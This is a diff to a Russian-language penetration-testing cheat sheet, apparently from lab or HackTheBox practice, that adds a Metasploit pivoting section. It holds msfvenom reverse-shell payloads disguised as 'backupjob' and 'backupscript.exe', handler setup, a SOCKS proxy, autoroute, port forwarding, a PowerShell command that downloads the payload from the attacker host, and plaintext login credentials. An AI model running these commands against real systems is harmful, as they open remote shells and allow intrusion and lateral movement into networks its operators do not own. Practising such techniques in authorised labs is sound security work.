@@ -334,7 +334,60 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 
 	sshuttle -r ebelford:'ThePlague61780'@10.10.11.54 -N 0.0.0.0/24 (проброс всего трафика)
 
+# Проброс трафика Metasploit
 
+	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+
+	установка сессии
+	use exploit/multi/handler
+	set lhost 0.0.0.0
+	set lport 8080
+	set payload linux/x64/meterpreter/reverse_tcp
+	run
+
+	bg
+
+	в msfcosole установка прокси
+	use auxiliary/server/socks_proxy
+	set SRVPORT 9050
+	set SRVHOST 0.0.0.0
+	set version 4a
+	run
+
+	в msfcosole подтверждение работы прокси-сервера.
+	msf6 auxiliary(server/socks_proxy) > jobs
+
+	Создание маршрутов с помощью AutoRoute 
+	use post/multi/manage/autoroute
+	set SESSION 1
+	set SUBNET 172.16.5.0
+	run
+
+	добавляем маршруты из meterpreter
+	run autoroute -s 172.16.5.0/23
+	run autoroute -p
+
+
+	proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+
+	---Предыдущее можно не писать-------
+	Создание локального TCP-ретранслятора (на собственном localhost)
+	meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+	xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+	netstat -antp
+
+	Обратное перенаправление портов Meterpreter
+	meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+	meterpreter > bg
+
+	use exploit/multi/handler
+	set payload windows/x64/meterpreter/reverse_tcp
+	set LPORT 8081 
+	set LHOST 0.0.0.0 
+	run
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+	Invoke-WebRequest -Uri "http://172.16.5.129:9001/backupscript.exe" -OutFile "backupscript.exe"
 
 # ПРОБРОС ТРФИКА GOST
 
